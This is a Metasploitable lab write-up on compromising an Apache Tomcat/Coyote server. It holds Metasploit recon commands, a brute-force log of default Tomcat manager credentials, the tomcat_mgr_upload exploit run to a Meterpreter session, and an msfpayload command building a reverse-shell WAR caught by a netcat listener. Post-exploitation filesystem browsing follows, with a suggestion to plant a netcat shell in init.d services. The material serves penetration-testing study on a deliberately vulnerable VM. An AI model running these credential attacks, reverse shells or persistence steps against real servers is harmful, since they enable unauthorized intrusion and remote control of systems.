<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>tomcat & coyote</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>tomcat & coyote</h1><br/><br /><strong>Reference:</strong> https://charlesreid1.com/wiki/Metasploitable/Apache/Tomcat_and_Coyote<br /><br /><h1>Metasploitable/Apache/Tomcat and Coyote</h1><br /><br /><br /><br /><h2>Contents</h2><br /><br />• 1 Tomcat Service◇ 1.1 What is tomcat<br />◇ 1.2 What is coyote<br /><br /><br />• 2 Tomcat Recon<br />• 3 Metasploit Modules for Tomcat◇ 3.1 Login Credentials▪ 3.1.1 tomcat mgr login<br /><br /><br />◇ 3.2 Uploading Java Executable with Metasploit▪ 3.2.1 Automated Metasploit File Upload<br />▪ 3.2.2 Set Metasploit Options<br />▪ 3.2.3 Run the Exploit (Failure)<br />▪ 3.2.4 Run the Exploit (Worked)<br />▪ 3.2.5 Houston, We Have A Meterpreter Shell<br /><br /><br />◇ 3.3 Uploading Java Executable Manually▪ 3.3.1 Craft WAR Payload<br />▪ 3.3.2 Netcat Listener<br />▪ 3.3.3 Houston, We Have a Shell<br />▪ 3.3.4 Clean Up<br /><br /><br /><br /><br />• 4 Flags<br /><br /><br /><br /><h1>Tomcat Service</h1><br />We will attempt to abuse the Tomcat server in order to obtain access to the web server. The end goal is to obtain a shell on the web server.<br />Just a reminder of what the nmap scan returned about Apache Tomcat and Coyote:<br />10.0.0.27  8180  tcp    http         open   Apache Tomcat/Coyote JSP engine 1.1<br />JSP stands for JavaServer Pages. All this means is, web pages accessed through port 8180 will be assembled by a Java web application.<br /><br /><h2>What is tomcat</h2><br />Apache Tomcat provides software to run Java applets in the browser. The nmap scan didn&#39;t return the version, so that&#39;s probably the first thing we&#39;ll want to figure out.<br /><br /><h2>What is coyote</h2><br />Coyote is a stand-alone web server that provides servlets to Tomcat applets. That is, it functions like the Apache web server, but for JavaServer Pages (JSP).<br />From the description of Coyote on the Tomcat page [1], it sounds like this server will be as susceptible to denial of service attacks as the Apache web server was.<br /><br /><br /><br /><h1>Tomcat Recon</h1><br />Let&#39;s start by doing some recon of the Tomcat server using the various HTTP scanners in Metasploit.<br />Running the HTTP dir scanner module turns up some goodies:<br />msf auxiliary(dir_listing) &gt; use auxiliary/scanner/http/dir_scanner<br />msf auxiliary(dir_scanner) &gt; set RHOSTS 10.0.0.27<br />RHOSTS =&gt; 10.0.0.27<br />msf auxiliary(dir_scanner) &gt; set RPORT 8180<br />RPORT =&gt; 8180<br />msf auxiliary(dir_scanner) &gt; run<br /><br />[*] Detecting error code<br />[*] Using code &#39;404&#39; as not found for 10.0.0.27<br />[*] Found http://10.0.0.27:8180/admin/ 200 (10.0.0.27)<br />[*] Found http://10.0.0.27:8180/jsp-examples/ 200 (10.0.0.27)<br />[*] Found http://10.0.0.27:8180/tomcat-docs/ 200 (10.0.0.27)<br />[*] Found http://10.0.0.27:8180/webdav/ 200 (10.0.0.27)<br />[*] Scanned 1 of 1 hosts (100% complete)<br />[*] Auxiliary module execution completed<br />msf auxiliary(dir_scanner) &gt;<br />These turn up some interesting pages that can potentially be bypassed:<br /><a href=""><img src="images/49-1.png" alt="images/49-1.png" /></a><br /><a href=""><img src="images/49-2.png" alt="images/49-2.png" /></a><br /><br /><h1>Metasploit Modules for Tomcat</h1><br />The recon we do feeds into the choice of Metasploit modules that we make. First, we have a login page - this provides us with a way to brute-force login credentials. Second, we have a WebDAV interface, and a potential avenue for uploading a PHP shell. Third, the server works much like the Apache server, and is susceptible to denial of service attacks.<br /><br /><h2>Login Credentials</h2><br />We can do a comprehensive search for all Tomcat-related modules in metasploit:<br />msf &gt; search tomcat<br /><br />Matching Modules<br />================<br /><br />   Name                                                         Disclosure Date  Rank       Description<br />   ----                                                         ---------------  ----       -----------<br />   auxiliary/admin/http/tomcat_administration                                    normal     Tomcat Administration Tool Default Access<br />   auxiliary/admin/http/tomcat_utf8_traversal                                    normal     Tomcat UTF-8 Directory Traversal Vulnerability<br />   auxiliary/admin/http/trendmicro_dlp_traversal                                 normal     TrendMicro Data Loss Prevention 5.5 Directory Traversal<br />   auxiliary/dos/http/apache_commons_fileupload_dos             2014-02-06       normal     Apache Commons FileUpload and Apache Tomcat DoS<br />   auxiliary/dos/http/apache_tomcat_transfer_encoding           2010-07-09       normal     Apache Tomcat Transfer-Encoding Information Disclosure and DoS<br />   auxiliary/dos/http/hashcollision_dos                         2011-12-28       normal     Hashtable Collisions<br />   auxiliary/scanner/http/tomcat_enum                                            normal     Apache Tomcat User Enumeration<br />   auxiliary/scanner/http/tomcat_mgr_login                                       normal     Tomcat Application Manager Login Utility<br />   exploit/multi/http/struts_code_exec_classloader              2014-03-06       manual     Apache Struts ClassLoader Manipulation Remote Code Execution<br />   exploit/multi/http/struts_default_action_mapper              2013-07-02       excellent  Apache Struts 2 DefaultActionMapper Prefixes OGNL Code Execution<br />   exploit/multi/http/struts_dev_mode                           2012-01-06       excellent  Apache Struts 2 Developer Mode OGNL Execution<br />   exploit/multi/http/tomcat_mgr_deploy                         2009-11-09       excellent  Apache Tomcat Manager Application Deployer Authenticated Code Execution<br />   exploit/multi/http/tomcat_mgr_upload                         2009-11-09       excellent  Apache Tomcat Manager Authenticated Upload Code Execution<br />   exploit/multi/http/zenworks_configuration_management_upload  2015-04-07       excellent  Novell ZENworks Configuration Management Arbitrary File Upload<br />   post/windows/gather/enum_tomcat                                               normal     Windows Gather Apache Tomcat Enumeration<br />We will focus on three modules:<br />auxiliary/scanner/http/tomcat_mgr_login<br />exploit/multi/http/tomcat_mgr_deploy<br />exploit/multi/http/tomcat_mgr_upload<br />Specifically, to obtain login credentials, we&#39;ll focus on tomcat_mgr_login.<br /><br /><h3>tomcat mgr login</h3><br />This module is, obviously, for logging into Tomcat.<br />Here is info on this module from the Rapid7 website: https://www.rapid7.com/db/modules/auxiliary/scanner/http/tomcat_mgr_login<br />Printing out the various options, it looks like a brute force method:<br />msf &gt; use auxiliary/scanner/http/tomcat_mgr_login<br />msf auxiliary(tomcat_mgr_login) &gt; show info<br /><br />       Name: Tomcat Application Manager Login Utility<br />     Module: auxiliary/scanner/http/tomcat_mgr_login<br />    License: Metasploit Framework License (BSD)<br />       Rank: Normal<br /><br />Provided by:<br />  MC &lt;mc@metasploit.com&gt;<br />  Matteo Cantoni &lt;goony@nothink.org&gt;<br />  jduck &lt;jduck@metasploit.com&gt;<br /><br />Basic options:<br />  Name              Current Setting                                                                 Required  Description<br />  ----              ---------------                                                                 --------  -----------<br />  BLANK_PASSWORDS   false                                                                           no        Try blank passwords for all users<br />  BRUTEFORCE_SPEED  5                                                                               yes       How fast to bruteforce, from 0 to 5<br />  DB_ALL_CREDS      false                                                                           no        Try each user/password couple stored in the current database<br />  DB_ALL_PASS       false                                                                           no        Add all passwords in the current database to the list<br />  DB_ALL_USERS      false                                                                           no        Add all users in the current database to the list<br />  PASSWORD                                                                                          no        A specific password to authenticate with<br />  PASS_FILE         /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt      no        File containing passwords, one per line<br />  Proxies                                                                                           no        A proxy chain of format type:host:port[,type:host:port][...]<br />  RHOSTS                                                                                            yes       The target address range or CIDR identifier<br />  RPORT             8080                                                                            yes       The target port<br />  STOP_ON_SUCCESS   false                                                                           yes       Stop guessing when a credential works for a host<br />  TARGETURI         /manager/html                                                                   yes       URI for Manager login. Default is /manager/html<br />  THREADS           1                                                                               yes       The number of concurrent threads<br />  USERNAME                                                                                          no        A specific username to authenticate as<br />  USERPASS_FILE     /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_userpass.txt  no        File containing users and passwords separated by space, one pair per line<br />  USER_AS_PASS      false                                                                           no        Try the username as the password for all users<br />  USER_FILE         /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt     no        File containing users, one per line<br />  VERBOSE           true                                                                            yes       Whether to print output for all attempts<br />  VHOST                                                                                             no        HTTP server virtual host<br /><br />Description:<br />  This module simply attempts to login to a Tomcat Application Manager<br />  instance using a specific user/pass.<br /><br />References:<br />  http://cvedetails.com/cve/2009-3843/<br />  http://www.osvdb.org/60317<br />  http://www.securityfocus.com/bid/37086<br />  http://cvedetails.com/cve/2009-4189/<br />  http://www.osvdb.org/60670<br />  http://www.harmonysecurity.com/blog/2009/11/hp-operations-manager-backdoor-account.html<br />  http://www.zerodayinitiative.com/advisories/ZDI-09-085<br />  http://cvedetails.com/cve/2009-4188/<br />  http://www.securityfocus.com/bid/38084<br />  http://cvedetails.com/cve/2010-0557/<br />  http://www-01.ibm.com/support/docview.wss?uid=swg21419179<br />  http://cvedetails.com/cve/2010-4094/<br />  http://www.zerodayinitiative.com/advisories/ZDI-10-214<br />  http://cvedetails.com/cve/2009-3548/<br />  http://www.osvdb.org/60176<br />  http://www.securityfocus.com/bid/36954<br />  http://tomcat.apache.org/<br />  http://cvedetails.com/cve/1999-0502/<br />We&#39;ll definitely want to try blank passwords. Let&#39;s set some options:<br />msf auxiliary(tomcat_mgr_login) &gt; workspace metasploitable<br />[*] Workspace: metasploitable<br />msf auxiliary(tomcat_mgr_login) &gt; set BLANK_PASSWORDS true<br />BLANK_PASSWORDS =&gt; true<br />msf auxiliary(tomcat_mgr_login) &gt; set RHOSTS 10.0.0.27<br />RHOSTS =&gt; 10.0.0.27<br />msf auxiliary(tomcat_mgr_login) &gt; set USER_AS_PASS true<br />USER_AS_PASS =&gt; true<br />msf auxiliary(tomcat_mgr_login) &gt; set RPORT 8180<br />RPORT =&gt; 8180<br />Now fire it up:<br />msf auxiliary(tomcat_mgr_login) &gt; run<br /><br />msf auxiliary(tomcat_mgr_login) &gt; run<br /><br />[-] 10.0.0.27:8180 TOMCAT_MGR - LOGIN FAILED: admin:admin (Incorrect: )<br />[-] 10.0.0.27:8180 TOMCAT_MGR - LOGIN FAILED: admin: (Incorrect: )<br />[-] 10.0.0.27:8180 TOMCAT_MGR - LOGIN FAILED: admin:admin (Incorrect: )<br />[-] 10.0.0.27:8180 TOMCAT_MGR - LOGIN FAILED: admin:manager (Incorrect: )<br />[-] 10.0.0.27:8180 TOMCAT_MGR - LOGIN FAILED: admin:role1 (Incorrect: )<br />[-] 10.0.0.27:8180 TOMCAT_MGR - LOGIN FAILED: admin:root (Incorrect: )<br />[-] 10.0.0.27:8180 TOMCAT_MGR - LOGIN FAILED: admin:tomcat (Incorrect: )<br />[-] 10.0.0.27:8180 TOMCAT_MGR - LOGIN FAILED: admin:s3cret (Incorrect: )<br />[-] 10.0.0.27:8180 TOMCAT_MGR - LOGIN FAILED: manager:manager (Incorrect: )<br />[-] 10.0.0.27:8180 TOMCAT_MGR - LOGIN FAILED: manager: (Incorrect: )<br />[-] 10.0.0.27:8180 TOMCAT_MGR - LOGIN FAILED: manager:admin (Incorrect: )<br />[-] 10.0.0.27:8180 TOMCAT_MGR - LOGIN FAILED: manager:manager (Incorrect: )<br />[-] 10.0.0.27:8180 TOMCAT_MGR - LOGIN FAILED: manager:role1 (Incorrect: )<br />[-] 10.0.0.27:8180 TOMCAT_MGR - LOGIN FAILED: manager:root (Incorrect: )<br />[-] 10.0.0.27:8180 TOMCAT_MGR - LOGIN FAILED: manager:tomcat (Incorrect: )<br />[-] 10.0.0.27:8180 TOMCAT_MGR - LOGIN FAILED: manager:s3cret (Incorrect: )<br />[-] 10.0.0.27:8180 TOMCAT_MGR - LOGIN FAILED: role1:role1 (Incorrect: )<br />[-] 10.0.0.27:8180 TOMCAT_MGR - LOGIN FAILED: role1: (Incorrect: )<br />[-] 10.0.0.27:8180 TOMCAT_MGR - LOGIN FAILED: role1:admin (Incorrect: )<br />[-] 10.0.0.27:8180 TOMCAT_MGR - LOGIN FAILED: role1:manager (Incorrect: )<br />[-] 10.0.0.27:8180 TOMCAT_MGR - LOGIN FAILED: role1:role1 (Incorrect: )<br />[-] 10.0.0.27:8180 TOMCAT_MGR - LOGIN FAILED: role1:root (Incorrect: )<br />[-] 10.0.0.27:8180 TOMCAT_MGR - LOGIN FAILED: role1:tomcat (Incorrect: )<br />[-] 10.0.0.27:8180 TOMCAT_MGR - LOGIN FAILED: role1:s3cret (Incorrect: )<br />[-] 10.0.0.27:8180 TOMCAT_MGR - LOGIN FAILED: root:root (Incorrect: )<br />[-] 10.0.0.27:8180 TOMCAT_MGR - LOGIN FAILED: root: (Incorrect: )<br />[-] 10.0.0.27:8180 TOMCAT_MGR - LOGIN FAILED: root:admin (Incorrect: )<br />[-] 10.0.0.27:8180 TOMCAT_MGR - LOGIN FAILED: root:manager (Incorrect: )<br />[-] 10.0.0.27:8180 TOMCAT_MGR - LOGIN FAILED: root:role1 (Incorrect: )<br />[-] 10.0.0.27:8180 TOMCAT_MGR - LOGIN FAILED: root:root (Incorrect: )<br />[-] 10.0.0.27:8180 TOMCAT_MGR - LOGIN FAILED: root:tomcat (Incorrect: )<br />[-] 10.0.0.27:8180 TOMCAT_MGR - LOGIN FAILED: root:s3cret (Incorrect: )<br />[+] 10.0.0.27:8180 - LOGIN SUCCESSFUL: tomcat:tomcat<br />[-] 10.0.0.27:8180 TOMCAT_MGR - LOGIN FAILED: both:both (Incorrect: )<br />[-] 10.0.0.27:8180 TOMCAT_MGR - LOGIN FAILED: both: (Incorrect: )<br />[-] 10.0.0.27:8180 TOMCAT_MGR - LOGIN FAILED: both:admin (Incorrect: )<br />[-] 10.0.0.27:8180 TOMCAT_MGR - LOGIN FAILED: both:manager (Incorrect: )<br />[-] 10.0.0.27:8180 TOMCAT_MGR - LOGIN FAILED: both:role1 (Incorrect: )<br />[-] 10.0.0.27:8180 TOMCAT_MGR - LOGIN FAILED: both:root (Incorrect: )<br />[-] 10.0.0.27:8180 TOMCAT_MGR - LOGIN FAILED: both:tomcat (Incorrect: )<br />[-] 10.0.0.27:8180 TOMCAT_MGR - LOGIN FAILED: both:s3cret (Incorrect: )<br />[-] 10.0.0.27:8180 TOMCAT_MGR - LOGIN FAILED: j2deployer:j2deployer (Incorrect: )<br />[-] 10.0.0.27:8180 TOMCAT_MGR - LOGIN FAILED: ovwebusr:OvW*busr1 (Incorrect: )<br />[-] 10.0.0.27:8180 TOMCAT_MGR - LOGIN FAILED: cxsdk:kdsxc (Incorrect: )<br />[-] 10.0.0.27:8180 TOMCAT_MGR - LOGIN FAILED: root:owaspbwa (Incorrect: )<br />[-] 10.0.0.27:8180 TOMCAT_MGR - LOGIN FAILED: ADMIN:ADMIN (Incorrect: )<br />[-] 10.0.0.27:8180 TOMCAT_MGR - LOGIN FAILED: xampp:xampp (Incorrect: )<br />[-] 10.0.0.27:8180 TOMCAT_MGR - LOGIN FAILED: QCC:QLogic66 (Incorrect: )<br />[*] Scanned 1 of 1 hosts (100% complete)<br />[*] Auxiliary module execution completed<br />Success! The username/password <code>tomcat/tomcat</code> will get us access to the server.<br /><br /><h2>Uploading Java Executable with Metasploit</h2><br />Just as obtaining a remote shell on the web server with Apache required uploading and executing a PHP script (see Metasploitable/Apache/DAV), obtaining a remote shell on the web server will require uploading and executing a file - but for Tomcat, the executable must be a JSP (JavaServer Pages) application.<br /><br /><h3>Automated Metasploit File Upload</h3><br />This is contained in the tomcat_mgr_upload module:<br />msf auxiliary(dir_scanner) &gt; use exploit/multi/http/tomcat_mgr_upload<br />msf exploit(tomcat_mgr_upload) &gt; show options<br /><br />Module options (exploit/multi/http/tomcat_mgr_upload):<br /><br />   Name       Current Setting  Required  Description<br />   ----       ---------------  --------  -----------<br />   PASSWORD                    no        The password for the specified username<br />   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]<br />   RHOST                       yes       The target address<br />   RPORT      80               yes       The target port<br />   TARGETURI  /manager         yes       The URI path of the manager app (/html/upload and /undeploy will be used)<br />   USERNAME                    no        The username to authenticate as<br />   VHOST                       no        HTTP server virtual host<br /><br /><br />Exploit target:<br /><br />   Id  Name<br />   --  ----<br />   0   Java Universal<br /><br /><h3>Set Metasploit Options</h3><br />Set some options for this exploit. We&#39;ll use the credentials we already found.<br />msf exploit(tomcat_mgr_upload) &gt; set USERNAME tomcat<br />USERNAME =&gt; tomcat<br />msf exploit(tomcat_mgr_upload) &gt; set PASSWORD tomcat<br />PASSWORD =&gt; tomcat<br />msf exploit(tomcat_mgr_upload) &gt; set RHOST 10.0.0.27<br />RHOST =&gt; 10.0.0.27<br />msf exploit(tomcat_mgr_upload) &gt; set RPORT 8180<br />RPORT =&gt; 8180<br />The <code>TARGETURI</code>variable should be left to the default, <code>manager/</code> - not set to admin.<br />msf exploit(tomcat_mgr_upload) &gt; set TARGETURI /manager<br />TARGETURI =&gt; /manager<br />Additionally, we&#39;ll need to set the target architecture:<br />msf exploit(tomcat_mgr_upload) &gt; show targets<br /><br />Exploit targets:<br /><br />   Id  Name<br />   --  ----<br />   0   Java Universal<br />   1   Windows Universal<br />   2   Linux x86<br /><br /><br />msf exploit(tomcat_mgr_upload) &gt; set TARGET 0<br />TARGET =&gt; 0<br /><br /><h3>Run the Exploit (Failure)</h3><br />Now we are ready to run:<br />msf exploit(tomcat_mgr_upload) &gt; run<br /><br />[*] Started reverse TCP handler on 10.0.0.25:4444<br />[*] 10.0.0.27:8180 - Retrieving session ID and CSRF token...<br />[*] 10.0.0.27:8180 - Finding CSRF token...<br />[*] 10.0.0.27:8180 - Uploading and deploying t1wR96yByt0JeBpX5z7z...<br />[*] 10.0.0.27:8180 - Uploading 6081 bytes as t1wR96yByt0JeBpX5z7z.war ...<br />[*] 10.0.0.27:8180 - Executing t1wR96yByt0JeBpX5z7z...<br />[*] 10.0.0.27:8180 - Executing /t1wR96yByt0JeBpX5z7z/UXnJq.jsp...<br />[*] 10.0.0.27:8180 - Finding CSRF token...<br />[*] 10.0.0.27:8180 - Undeploying t1wR96yByt0JeBpX5z7z ...<br />[*] Exploit completed, but no session was created.<br />Does not work. Not sure why.<br />After running the above exploit, I can log into the management page and see the WAR is successfully being uploaded by Metasploit, and that the module is active and running.<br />Can configure the correct path to the Tomcat manager (which is <code>/manager</code>).<br />(Note: many admins will disable these Tomcat modules or change the name of directories.)<br /><br /><br /><br /><h3>Run the Exploit (Worked)</h3><br />I set this aside for a day, and found another workaround (covered below). But then, later, the exploit worked as intended.<br />msf exploit(tomcat_mgr_upload) &gt; set USERNAME tomcat<br />USERNAME =&gt; tomcat<br />msf exploit(tomcat_mgr_upload) &gt; set PASSWORD tomcat<br />PASSWORD =&gt; tomcat<br />msf exploit(tomcat_mgr_upload) &gt; set RHOST 10.0.0.27<br />RHOST =&gt; 10.0.0.27<br />msf exploit(tomcat_mgr_upload) &gt; set RPORT 8180<br />RPORT =&gt; 8180<br />msf exploit(tomcat_mgr_upload) &gt; run<br /><br />[*] Started reverse TCP handler on 10.0.0.5:4444<br />[*] 10.0.0.27:8180 - Retrieving session ID and CSRF token...<br />[*] 10.0.0.27:8180 - Uploading and deploying cjMiuUTZpif5w0UB5FgrZY...<br />[*] 10.0.0.27:8180 - Executing cjMiuUTZpif5w0UB5FgrZY...<br />[*] 10.0.0.27:8180 - Undeploying cjMiuUTZpif5w0UB5FgrZY ...<br />[*] Sending stage (45741 bytes) to 10.0.0.27<br />[*] Meterpreter session 1 opened (10.0.0.5:4444 -&gt; 10.0.0.27:50621) at 2016-03-30 19:33:50 -0700<br /><br />meterpreter &gt;<br /><br /><h3>Houston, We Have A Meterpreter Shell</h3><br />Now we have a meterpreter shell! Over and on to <a href="https://charlesreid1.com/wiki/Meterpreter">Meterpreter</a>.<br /><br /><h2>Uploading Java Executable Manually</h2><br />For some reason, the metasploit automated payload deployment had some problems. However, we can still exploit this server manually.<br />The management web interface gives us a place to upload WAR files, and a way to execute them manually.<br /><a href="https://charlesreid1.com/w/images/thumb/c/c1/Tomcat_upload.png/500px-Tomcat_upload.png"><img src="images/49-3.png" alt="images/49-3.png" /></a><br />We can use Metasploit to craft a WAR file with the payload, then manually upload and execute it.<br /><br /><h3>Craft WAR Payload</h3><br />http://securitypadawan.blogspot.com/2011/11/attacking-metasploitable-tomcat-this-is.html<br /># msfpayload linux/x86/shell_reverse_tcp LHOST=10.0.0.25 LPORT=4444 W &gt; runme.war<br />Now we upload the runme.war file, and set it running on the Tomcat server:<br /><a href="https://charlesreid1.com/w/images/thumb/b/b5/Tomcat_runme_upload.png/500px-Tomcat_runme_upload.png"><img src="images/49-4.png" alt="images/49-4.png" /></a><br />Note that this does NOT execute the payload yet!!!<br />To execute the payload and run the actual war file, we will need to visit the page http://10.0.0.27:8180/runme/. However, this will try and connect to our command-and-control server on port 4444, and we need to be listening for the incoming connection.<br />We&#39;ll use netcat to receive the incoming shell once the WAR file is executed.<br /><br /><h3>Netcat Listener</h3><br />Now we set netcat listening on port 4444, the port we hard-coded into our payload:<br /># nc -v -l -p 4444<br />Now, netcat will listen for the incoming connection, so you&#39;re ready to execute your payload.<br />Once the <code>runme.war</code> module is enabled through the Tomcat server, visit the applet in your browser:<br />http://10.0.0.27:8180/runme/<br />You&#39;ll see the incoming TCP connection in netcat.<br />root@morpheus:~# nc -v -l -p 4444<br />listening on [any] 4444 ...<br /><br />10.0.0.27: inverse host lookup failed: Unknown host<br />connect to [10.0.0.25] from (UNKNOWN) [10.0.0.27] 35148<br /><br /><h3>Houston, We Have a Shell</h3><br />Congrats - we&#39;ve got ourselves a shell!<br />The shell is nothing fancy, but it lets us do some things on the filesystem.<br />We are the tomcat 5.5 user:<br />id<br />uid=110(tomcat55) gid=65534(nogroup) groups=65534(nogroup)<br />Here I list the contents of the root directory:<br />cd /<br />ls<br />bin<br />boot<br />cdrom<br />dev<br />etc<br />home<br />initrd<br />initrd.img<br />lib<br />lost+found<br />media<br />mnt<br />nohup.out<br />opt<br />proc<br />root<br />sbin<br />srv<br />sys<br />tmp<br />usr<br />var<br />vmlinuz<br />Note that you are not root so you cannot modify files that you don&#39;t own. Same goes for trying to access SSH keys - if they&#39;re read-only for that user, you won&#39;t be able to see them.<br />ls -la<br />lrwxrwxrwx 1 root     root        9 2012-05-14 00:26 .bash_history -&gt; /dev/null<br />drwxr-xr-x 4 msfadmin msfadmin 4096 2010-04-17 14:11 .distcc<br />drwx------ 2 msfadmin msfadmin 4096 2016-03-29 06:25 .gconf<br />drwx------ 2 msfadmin msfadmin 4096 2016-03-29 06:25 .gconfd<br />-rw-r--r-- 1 msfadmin msfadmin  586 2010-03-16 19:12 .profile<br />-rwx------ 1 msfadmin msfadmin    4 2012-05-20 14:22 .rhosts<br />drwx------ 2 msfadmin msfadmin 4096 2010-05-17 21:43 .ssh<br />drwxr-xr-x 6 msfadmin msfadmin 4096 2010-04-27 23:44 vulnerable<br />-rw------- 1 msfadmin msfadmin   60 2016-03-27 19:14 .Xauthority<br />touch .bash_history<br />ls -la<br />total 40<br />drwxr-xr-x 7 msfadmin msfadmin 4096 2016-03-27 19:14 .<br />drwxr-xr-x 6 root     root     4096 2010-04-16 02:16 ..<br />lrwxrwxrwx 1 root     root        9 2012-05-14 00:26 .bash_history -&gt; /dev/null<br />drwxr-xr-x 4 msfadmin msfadmin 4096 2010-04-17 14:11 .distcc<br />drwx------ 2 msfadmin msfadmin 4096 2016-03-29 06:25 .gconf<br />drwx------ 2 msfadmin msfadmin 4096 2016-03-29 06:25 .gconfd<br />-rw-r--r-- 1 msfadmin msfadmin  586 2010-03-16 19:12 .profile<br />-rwx------ 1 msfadmin msfadmin    4 2012-05-20 14:22 .rhosts<br />drwx------ 2 msfadmin msfadmin 4096 2010-05-17 21:43 .ssh<br />drwxr-xr-x 6 msfadmin msfadmin 4096 2010-04-27 23:44 vulnerable<br />-rw------- 1 msfadmin msfadmin   60 2016-03-27 19:14 .Xauthority<br />You can also dump the contents of the startup scripts:<br />cd /etc/init.d<br />ls<br />You could modify one of these services (or add a new one) to open a netcat shell. Need some additional practice with these netcat shells. It&#39;s possible to use a text editor like vi, but also very clunky.<br />It should be a lot easier to utilize an open reverse TCP connection to transfer files with netcat.<br />http://securitypadawan.blogspot.com/2011/11/attacking-metasploitable-tomcat-this-is.html<br /><br /><h3>Clean Up</h3><br />Remove the runme war file by going back to http://10.0.0.27:8180/manager/html and clicking &quot;Undeploy&quot;.<br /><br /><br /><br /></div>
</body>
</html>
